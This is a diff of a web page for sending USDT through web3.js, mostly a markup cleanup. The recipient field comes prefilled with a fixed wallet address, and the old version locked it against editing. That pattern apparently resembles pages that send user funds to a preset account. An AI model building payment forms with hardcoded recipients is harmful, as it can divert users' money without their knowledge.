@@ -1,42 +1,35 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Send USDT</title>
   <link rel="stylesheet" href="style.css" />
-  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
   <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
 </head>
-
 <body>
   <div class="container">
-    <h2>Send USDT</h2>
+    <h1>Send USDT</h1>
 
-    <label>Address or Domain Name</label>
+    <label for="address">Address or Domain Name</label>
     <div class="input-group">
-      <span class="material-icons icon-btn" onclick="clearAddress()">close</span>
-      <input type="text" id="address" value="0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999" disabled />
-      <button onclick="copyAddress()">Paste</button>
-      <span class="material-icons icon-btn">qr_code_scanner</span>
-      <span class="material-icons icon-btn">fullscreen</span>
+      <input type="text" id="address" value="0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999" />
+      <button onclick="clearAddress()">&#10005;</button>
+      <button onclick="pasteAddress()">Paste</button>
     </div>
 
-    <label>Amount</label>
+    <label for="amount">Amount</label>
     <div class="input-group">
-      <input type="text" id="amount" placeholder="USDT Amount" />
+      <input type="number" id="amount" placeholder="USDT Amount" oninput="updateUSD()" />
       <span>USDT</span>
       <button onclick="setMax()">Max</button>
     </div>
-
     <p id="usd-value">≈ $0.00</p>
 
-    <button id="next-btn" onclick="transferUSDT()">Next</button>
-    <div class="status" id="status"></div>
+    <button class="next-btn" onclick="transferUSDT()">Next</button>
+    <p id="status"></p>
   </div>
 
   <script src="script.js"></script>
 </body>
-
 </html>
